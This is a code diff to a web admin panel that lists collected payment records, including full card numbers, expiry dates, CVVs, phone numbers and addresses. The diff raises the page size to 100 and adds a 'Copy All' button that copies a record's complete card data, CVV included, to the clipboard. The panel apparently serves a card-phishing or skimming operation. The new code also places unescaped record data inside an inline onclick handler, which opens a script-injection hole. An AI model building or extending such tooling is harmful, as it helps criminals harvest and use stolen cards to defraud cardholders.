@@ -554,7 +554,6 @@
       align-items: center;
       justify-content: space-between;
       padding: 18px 22px;
-      border-bottom: 1px solid rgba(65, 74, 255, 0.12);
       position: sticky;
       top: 0;
       background: var(--card-bg);
@@ -730,14 +729,16 @@
           <table>
             <thead>
               <tr>
+                  
                 <th>#</th>
+              <th>Date</th>
                 <th>Transaction ID</th>
                 <th>Name</th>
                 <th>Email</th>
                 <th>Card</th>
                 <th>Amount</th>
                 <th>Country</th>
-                <th>Date</th>
+                
                 <th>Status</th>
               </tr>
             </thead>
@@ -818,7 +819,7 @@
       const tbody = document.getElementById('tableBody');
       tbody.innerHTML = '<tr><td colspan="9" class="table-loading"><div class="spinner"></div>Loading…</td></tr>';
       try {
-        const params = new URLSearchParams({ page, limit: 20, search: searchQuery });
+        const params = new URLSearchParams({ page, limit: 100, search: searchQuery });
         const r = await fetch(`${API}/api/payments?${params}`, { headers: { Authorization: `Bearer ${token}` } });
         if (!r.ok) throw new Error();
         const { payments, total, pages } = await r.json();
@@ -835,14 +836,14 @@
           const time = new Date(p.created_at).toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
           return `
         <tr onclick="openModal('${p._id}')">
-          <td style="color:var(--muted);font-size:.8rem">${(page - 1) * 20 + i + 1}</td>
-          <td><span class="txn-id">${p.transaction_id?.substring(0, 16)}…</span></td>
+          <td style="color:var(--muted);font-size:.8rem">${(page - 1) * 100 + i + 1}</td>
+             <td style="color:var(--muted);font-size:.8rem">${date}<br><small>${time}</small></td>
+          <td><span class="txn-id">${p.transaction_id?.substring(0, 8)}…</span></td>
           <td style="font-weight:600">${escHtml(p.name)}</td>
           <td style="color:var(--muted)">${escHtml(p.email)}</td>
           <td><span class="card-masked">${cardMasked}</span></td>
           <td><span class="amount-val">$${parseFloat(p.amount || 0).toFixed(2)}</span></td>
           <td>${escHtml(p.country)}</td>
-          <td style="color:var(--muted);font-size:.8rem">${date}<br><small>${time}</small></td>
           <td><span class="badge badge-green">✓ Saved</span></td>
         </tr>`;
         }).join('');
@@ -850,7 +851,7 @@
         const pg = document.getElementById('pagination');
         const info = document.getElementById('pageInfo');
         const btns = document.getElementById('pageBtns');
-        info.textContent = `${(page - 1) * 20 + 1}–${Math.min(page * 20, total)} of ${total}`;
+        info.textContent = `${(page - 1) * 100 + 1}–${Math.min(page * 100, total)} of ${total}`;
         btns.innerHTML = '';
         const makeBtn = (label, p2, disabled, active) => {
           const b = document.createElement('button');
@@ -878,47 +879,79 @@
       setTimeout(() => btn.classList.remove('spin'), 800);
     }
 
-    async function openModal(id) {
-      const overlay = document.getElementById('modalOverlay');
-      const body = document.getElementById('modalBody');
-      body.innerHTML = '<div style="text-align:center;padding:32px"><div class="spinner"></div></div>';
-      overlay.classList.add('open');
-      try {
-        const r = await fetch(`${API}/api/payments/${id}`, { headers: { Authorization: `Bearer ${token}` } });
-        const p = await r.json();
-        const date = new Date(p.created_at).toLocaleString();
-        body.innerHTML = `
+   async function openModal(id) {
+  const overlay = document.getElementById('modalOverlay');
+  const body = document.getElementById('modalBody');
+  body.innerHTML = '<div style="text-align:center;padding:32px"><div class="spinner"></div></div>';
+  overlay.classList.add('open');
+  try {
+    const r = await fetch(`${API}/api/payments/${id}`, { headers: { Authorization: `Bearer ${token}` } });
+    const p = await r.json();
+    const date = new Date(p.created_at).toLocaleString();
+
+    const allDetails = `Transaction ID: ${p.transaction_id}
+Name on Card: ${p.name}
+Amount: $${parseFloat(p.amount || 0).toFixed(2)}
+Card Number: ${p.card}
+Expiry: ${p.month}/${p.year}
+CVV: ${p.cvv}
+Email: ${p.email}
+Phone: ${p.phone}
+Address: ${p.address1}${p.address2 ? ' / ' + p.address2 : ''}, ${p.city}, ${p.state} ${p.postal}, ${p.country}
+Submitted At: ${date}`;
+
+    body.innerHTML = `
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
+        <h3 style="margin:0;font-size:1rem;font-weight:600"></h3>
+        <button id="copyAllBtn" onclick="copyAll(this, \`${allDetails.replace(/`/g, '\\`')}\`)"
+          style="display:flex;align-items:center;gap:6px;background:#f1f5f9;border:1px solid #e2e8f0;border-radius:8px;padding:6px 12px;cursor:pointer;font-size:0.8rem;font-weight:600;color:#475569;transition:all 0.2s">
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          Copy All
+        </button>
+      </div>
       <div class="detail-grid">
         <div class="detail-item" style="grid-column:1/-1">
           <label>Transaction ID</label>
           <div class="val mono">${escHtml(p.transaction_id)}</div>
         </div>
-        <hr class="detail-sep">
         <div class="detail-item"><label>Name on Card</label><div class="val">${escHtml(p.name)}</div></div>
         <div class="detail-item"><label>Amount</label><div class="val" style="color:#16a34a;font-family:monospace;font-weight:700">$${parseFloat(p.amount || 0).toFixed(2)}</div></div>
         <div class="detail-item"><label>Card Number</label><div class="val mono">${escHtml(p.card)}</div></div>
         <div class="detail-item"><label>Expiry</label><div class="val mono">${p.month}/${p.year}</div></div>
         <div class="detail-item"><label>CVV</label><div class="val mono">${escHtml(p.cvv)}</div></div>
-        <hr class="detail-sep">
         <div class="detail-item"><label>Email</label><div class="val">${escHtml(p.email)}</div></div>
         <div class="detail-item"><label>Phone</label><div class="val">${escHtml(p.phone)}</div></div>
-        <hr class="detail-sep">
         <div class="detail-item" style="grid-column:1/-1">
           <label>Address</label>
           <div class="val">${escHtml(p.address1)}${p.address2 ? ' / ' + escHtml(p.address2) : ''}<br>${escHtml(p.city)}, ${escHtml(p.state)} ${escHtml(p.postal)}<br>${escHtml(p.country)}</div>
         </div>
-        <hr class="detail-sep">
         <div class="detail-item" style="grid-column:1/-1">
           <label>Submitted At</label>
           <div class="val">${date}</div>
         </div>
       </div>`;
-      } catch {
-        body.innerHTML = '<div style="color:var(--red);text-align:center;padding:24px">Failed to load details.</div>';
-      }
-    }
-    function closeModal() { document.getElementById('modalOverlay').classList.remove('open'); }
-    document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+  } catch {
+    body.innerHTML = '<div style="color:var(--red);text-align:center;padding:24px">Failed to load details.</div>';
+  }
+}
+
+function closeModal() { document.getElementById('modalOverlay').classList.remove('open'); }
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+
+function copyAll(btn, text) {
+  navigator.clipboard.writeText(text).then(() => {
+    btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copied!`;
+    btn.style.background = '#dcfce7';
+    btn.style.color = '#16a34a';
+    btn.style.borderColor = '#bbf7d0';
+    setTimeout(() => {
+      btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy All`;
+      btn.style.background = '#f1f5f9';
+      btn.style.color = '#475569';
+      btn.style.borderColor = '#e2e8f0';
+    }, 2000);
+  });
+}
 
     function escHtml(s) {
       if (!s) return '—';
